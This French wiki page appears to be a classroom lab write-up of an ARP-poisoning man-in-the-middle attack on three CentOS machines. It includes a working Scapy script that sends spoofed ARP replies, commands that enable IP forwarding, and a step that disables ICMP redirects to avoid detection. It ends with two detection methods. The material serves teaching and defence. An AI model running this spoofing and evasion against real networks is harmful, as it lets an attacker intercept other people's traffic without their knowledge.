---
title: ARP poisoning
description: Un type d'attaque man-in-the-middle
published: true
date: 2019-11-03T22:46:51.839Z
tags: 
editor: undefined
dateCreated: 2019-11-03T22:46:49.876Z
---

# ARP poisoning

Dans le cas d'une attaque man-in-the-middle utilisant l'ARP poisoning, nous chercherons à compromettre les caches ARP des victimes afin de leur servir d'intermédiaire lorsque ces dernières communiqueront entre elles. Nous n'affecterons pas les adresses IP mais travaillerons au niveau des adresses MAC.

La simulation d'attaque présentée ici a été réalisée en salle 5105.


# Mise en place de la simulation

Les machines utilisées tourneront sous CentOS. 

Nous utiliserons trois machines, configurées comme suit :

````bash
# Machine A
ifconfig enp1s0f0 192.168.10.1 up
# Machine B
ifconfig enp1s0f0 192.168.10.2 up
# Machine attaquante
ifconfig enp1s0f0 192.168.10.3 up
````

Les trois machines seront interconnectées en LAN, séparées par un switch.

Nous utiliserons Scapy, une librairie python permettant de générer et d'envoyer des trames.

````bash
yum install python-scapy
````

Par la suite, nous utiliserons les imports suivants dans nos scripts python :

```python
from scapy.all import ARP
from scapy.all import send

from time import sleep
```

 
# Réalisation de l'attaque

## Faiblesse du protocole ARP

Le protocole ARP (Address Resolution Protocol) permet à une machine A, possédant l'adresse IP d'une machine B, d'obtenir l'adresse MAC de la machine B.

Le protocole se compose de deux principales étapes :

* ARP "who has xxx.xxx.xxx.xxx?" - la machine A diffuse cette requête en broadcast.

* ARP "xxx.xxx.xxx.xxx it at xx:xx:xx:xx:xx:xx" - la machine B répond à la machine A en lui donnant son adresse MAC.


<div style = "text-align : justify">Dans le cas où la machine A recevrait plusieurs réponses, seule la première réponse sera prise en compte. 

<div style = "text-align : justify">Par la suite, l'objectif sera, pour l'attaquant, de répondre à la requête de A avant que B ne le fasse, puis de rediriger les communications de A vers B, afin que tout semble normal.


Nous pourrons utiliser les commandes bash suivantes afin manipuler "à la main" les caches ARP :

```bash
# Afficher la table ARP :
arp -e

# Supprimer une entrée dans la table ARP (en tant que root) :
arp -d xxx.xxx.xxx.xxx
```



### Mise en place de l'attaque

<div style = "text-align : justify">Nous allons réaliser le script suivant : toutes les secondes, nous émettrons des requêtes ARP "is at" à l'intention de la machine A et de la machine B leur faisant croire que l'autre machine se situe à l'adresse MAC de l'attaquant.

​    

Voici le script python mis en place et exécuté (exécution en tant que root nécessaire) :

````python
request_A = ARP( op = ARP.is_at,		# 192.168.10.2 is at b4:96:91:2f:61:9e
		hwsrc = "b4:96:91:2f:61:9e", 	# own MAC adress
		psrc = "192.168.10.2",			# spoofed IP adress
		pdst = "192.168.10.1" )			# target IP adress

request_B = ARP( op = ARP.is_at,		# 192.168.10.1 is at b4:96:91:2f:61:9e
		hwsrc = "b4:96:91:2f:61:9e", 	# own MAC adress
		psrc = "192.168.10.1",			# spoofed IP adress
		pdst = "192.168.10.2" )			# target IP adress

while True :
    send(request_A)						# root required
    send(request_B)						# root required
    sleep(1)
````



<div style = "text-align : justify">Lorsque la machine A lance un ping vers la machine B, on remarque que cette dernière se met à pinger la machine attaquante. Toutefois, le ping n'atteint jamais la machine B.


<div style = "text-align : justify">Afin de permettre le routage des paquets IP au niveau de la machine attaquante, nous activerons l'ip foward avec la commande suivante :


```bash
# en tant que root
echo 1 > /proc/sys/net/ipv4/ip_forward
```

<div style = "text-align : justify">A partir de ce moment, les echo-requests émis par la machine A atteignent bien la machine B et les echo-replies émis par la machine B atteignent bien la machine A. 
<div style = "text-align : justify">De plus, la machine attaquante voit passer tous les paquets sur son interfaces (cette dernière route les paquets de A vers B et inversement).



<div style = "text-align : justify">Toutefois, selon la configuration de la machine attaquante, un problème peut subsister : cette dernière émet un message icmp de type 5 (redirect host) indiquant un routage. Cela peut éveiller des soupçons au niveau des machines ciblées.


Afin de désactiver les messages icmp de type 5, nous utilisons les commandes suivantes :

````bash
# en tant que root
echo 0 > /proc/sys/net/ipv4/conf/enp1s0f0/send_redirects
# en tant que root
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
````

A partir de ce moment, un utilisateur qui n'écoute pas au niveau de ses interfaces n'a aucun moyen détecter l'attaque. 



### Détection de l'attaque

D'un point de vue défénse, il existe deux principaux moyens de détecter cette attaque.

<div style = "text-align : justify">Le premier est de lever une alerte lorsque un nombre trop important de messages ARP "is at" arrivent au niveau d'une interface et ne correspond en rien au nombre de messages "who has" émis. 

<div style = "text-align : justify">Le second est de constater que, dans la table ARP des victimes, deux adresses IP appartenant à un même réseau ont la même adresse MAC. Cela est conséquent à la prise de contact qu'a dû effectuer la machine attaquante afin de récupérer les adresses MAC des victimes et ainsi pouvoir commuter les paquets.